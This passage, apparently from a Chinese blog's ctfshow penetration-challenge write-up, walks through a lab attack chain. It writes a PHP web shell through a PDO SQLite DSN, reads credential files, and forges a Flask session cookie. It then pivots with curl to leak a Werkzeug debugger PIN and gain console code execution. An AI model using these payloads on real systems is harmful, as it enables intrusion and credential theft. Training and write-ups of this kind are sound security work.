class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>Enter Database username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Enter Database password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;dsn&quot;</span>&gt;</span>Enter Database DSN:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dsn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dsn&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;query&quot;</span>&gt;</span>Enter TEST Query:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;query&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag6：ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</code></p><h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><h4 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a>跳岛战术</h4><p>需要<strong>拿到config.php中的数据库密码</strong></p><p>提示我们渗透进内网php服务器，而上面我们获取的服务器就是php环境，估计config.php就在这上面。</p><p>该表单接受4个参数，<code>username、password、dsn和query</code></p><p>hint:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">sqlite</span><br></pre></td></tr></table></figure><p>sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p><p>先创建一个users表，包含字段name，利用PDO连接数据库的dsn，并将数据库文件命名为1.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=1&amp;password=1&amp;query=CREATE TABLE users (name TEXT);&amp;dsn=sqlite:1.php</span><br></pre></td></tr></table></figure><p>尝试写马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=1&amp;password=1&amp;query=INSERT INTO users (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);&amp;dsn=sqlite:1.php</span><br></pre></td></tr></table></figure><blockquote><p>建议在burp上进行</p></blockquote><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-212120.png"></p><p>再访问1.php执行马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1.php</span><br><span class="line">/cmd.php?0=cat config.php</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-212458.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库连接配置</span></span><br><span class="line"><span class="variable">$database_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database_user</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$database_password</span> = <span class="string">&quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;</span>;</span><br><span class="line"><span class="variable">$database_name</span> = <span class="string">&quot;web_db_2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> =<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dsn&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dsn</span> &amp;&amp; <span class="variable">$username</span> &amp;&amp; <span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="title function_ invoke__">pdo_init</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pdo</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;database init faild&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title function_ invoke__">pdo_query</span>(<span class="variable">$pdo</span>, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="title function_ invoke__">pdo_close</span>(<span class="variable">$pdo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stmt</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;database test success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;database test error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_init</span>(<span class="params"><span class="variable">$dns</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dns</span>,<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pdo</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;数据库连接失败：&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_query</span>(<span class="params"><span class="variable">$pdo</span>, <span class="variable">$sql</span>, <span class="variable">$params</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;数据库操作失败：&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_close</span>(<span class="params"><span class="variable">$pdo</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag7：ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</code></p><h4 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a>邮箱迷云</h4><p>要求<strong>提交park在2024年12月27日19时20分收到的邮件中的数字</strong></p><p>通过上传的马执行RCE我们发现根目录下有个secret.txt文件：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-215248.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><p>分别base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>拼接起来进行base64解码：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-215849.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>这是163邮箱的账号密码</p><p><code>flag8：ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</code></p><h3 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h3><h4 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a>再下一城</h4><p>需要<strong>提交log_server_key.txt内容</strong></p><p>之前的main.py.bak提到了<code>log_server_key.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的密钥，用于加密会话等</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 在会话中设置用户为 guest</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查会话中的用户是否为 admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /key 路由，处理 GET 请求，获取特定文件中的密钥</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 尝试打开文件读取密钥</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /set_log_option 路由，处理设置日志选项的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志名称和日志文件名称</span></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日志记录器并添加文件处理器</span></span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清空日志文件内容</span></span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /get_log_content 路由，处理获取日志内容的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志文件名称</span></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    <span class="comment"># 拼接文件路径</span></span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空指定文件内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用，开启调试模式，监听所有 IP 地址，端口为 8888</span></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>而通过爆破可以测出8888端口的flask服务：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-221222.png"></p><p>而访问时发现有cookie：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-185100.png"></p><p>毫无疑问<strong>session伪造</strong>了，密钥给了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5</span><br></pre></td></tr></table></figure><p><strong>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27; -t &#x27;&#123;&quot;user&quot;:&quot;admin&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-190858.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4</span><br></pre></td></tr></table></figure><p>拿到伪造的cokie后直接访问是不行的，这里需要我们利用之前写的马通过curl命令将cookie带过去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  http://172.2.237.6:8888/key</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-193501.png"></p><p><code>flag9：ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</code></p><h4 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h4><p>需要<strong>提交flask所在服务器的&#x2F;etc&#x2F;passwd 文件最后一行内容</strong></p><p>main.py.bak可以看到debug为true，或许可以打<strong>pin码泄露</strong>。</p><p>访问<code>/console</code>路由：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-200132.png"></p><p>可以看到用了Werkzeug，同时console的key：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">motSXRASEKviSbHLumrO</span><br></pre></td></tr></table></figure><p>下面需要<strong>创建一个日志文件，将pin码打印在文件上</strong></p><p>而设置<strong>loggername为werkzeug记录flask的日志</strong>（可在logdict里看）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/set_log_option%3flogName=werkzeug%2526logFile=main.log&quot;</span><br></pre></td></tr></table></figure><p>这里可以通过<strong>printpin来泄露pin码</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/console%3f__debugger__=yes%2526cmd=printpin%2526s=motSXRASEKviSbHLumrO&quot;</span><br></pre></td></tr></table></figure><p>查看我们的日志文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/get_log_content?logFile=main.log&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-205814.png"></p><p>拿到pin码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">834-059-141</span><br></pre></td></tr></table></figure><p>然后用<strong>pin码进行验证</strong>，将cookie保存在本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -c 1.txt -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/console%3f__debugger__=yes%2526cmd=pinauth%2526pin=834-059-141%2526s=motSXRASEKviSbHLumrO&quot;</span><br></pre></td></tr></table></figure><p>访问1.txt拿到cookie:</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-210546.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49</span><br></pre></td></tr></table></figure><p>利用cookie去进行RCE，这里直接读：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span 